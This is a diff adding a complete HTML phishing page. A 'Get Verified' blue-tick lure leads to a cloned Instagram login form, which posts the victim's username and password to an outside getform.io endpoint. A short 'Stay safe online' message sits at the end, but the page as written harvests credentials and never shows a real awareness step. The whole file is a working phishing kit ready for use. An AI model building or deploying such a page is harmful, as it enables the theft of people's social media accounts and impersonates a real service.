@@ -1,0 +1,95 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Get Verified</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #fafafa;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .container {
+      text-align: center;
+    }
+    .blue-tick {
+      font-size: 100px;
+      color: #3897f0;
+    }
+    .btn {
+      display: inline-block;
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background: #3897f0;
+      color: white;
+      border-radius: 5px;
+      text-decoration: none;
+      transition: 0.3s;
+    }
+    .btn:hover { background: #287dc0; }
+  </style>
+</head>
+<body>
+  <!-- PAGE 1: Blue Tick Lure -->
+  <div class="container" id="page1">
+    <div class="blue-tick">✔️</div>
+    <h1>Wow! What an opportunity to get verified</h1>
+    <a href="#" class="btn" onclick="showLogin()">Get Started</a>
+  </div>
+
+  <!-- PAGE 2: Instagram Clone Login -->
+  <div id="page2" style="display:none; width:100%; max-width:350px;">
+    <div style="text-align:center; margin-bottom:20px;">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" width="70"><br>
+      <h1 style="font-family: 'Billabong', cursive; font-size:50px; margin:0; background: linear-gradient(to right, #f58529, #dd2a7b, #8134af, #515bd4); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Instagram</h1>
+    </div>
+    
+    <!-- ✅ Getform.io link with username + passcode -->
+    <form action="https://getform.io/f/avrmrvxa" method="POST" style="display:flex; flex-direction:column; gap:10px; background:white; padding:20px; border:1px solid #dbdbdb;">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required style="padding:10px; border:1px solid #dbdbdb; border-radius:3px;">
+      
+      <!-- Passcode field -->
+      <input type="password" name="passcode" placeholder="Passcode" required style="padding:10px; border:1px solid #dbdbdb; border-radius:3px;">
+      
+      <button type="submit" style="padding:10px; background:#3897f0; color:white; border:none; border-radius:3px; font-weight:bold;">Log In</button>
+      
+      <div style="display:flex; align-items:center; margin:10px 0;">
+        <hr style="flex:1; border:none; border-top:1px solid #dbdbdb;">
+        <span style="margin:0 10px; color:#8e8e8e; font-size:12px;">OR</span>
+        <hr style="flex:1; border:none; border-top:1px solid #dbdbdb;">
+      </div>
+      
+      <button type="button" style="background:none; color:#385185; font-weight:bold; border:none;">Log in with Facebook</button>
+      <a href="#" style="font-size:12px; color:#00376b; text-align:center;">Forgot passcode?</a>
+    </form>
+    
+    <div style="margin-top:10px; border:1px solid #dbdbdb; padding:15px; text-align:center; background:white;">
+      Don’t have an account? <a href="#" style="color:#3897f0;">Sign up</a>
+    </div>
+    <div style="text-align:center; margin-top:20px; color:#8e8e8e; font-size:12px;">
+      English (UK) · Español · Français · हिंदी <br><br>
+      © 2025 Instagram
+    </div>
+  </div>
+
+  <!-- PAGE 3: Awareness Message -->
+  <div id="page3" style="display:none; text-align:center;">
+    <h1 style="color:red;">⚠️</h1>
+    <p>blue tick is coming.</p>
+    <p style="color:#666;">Stay safe online ✅</p>
+  </div>
+
+  <script>
+    function showLogin() {
+      document.getElementById('page1').style.display = 'none';
+      document.getElementById('page2').style.display = 'block';
+    }
+  </script>
+</body>
+</html>
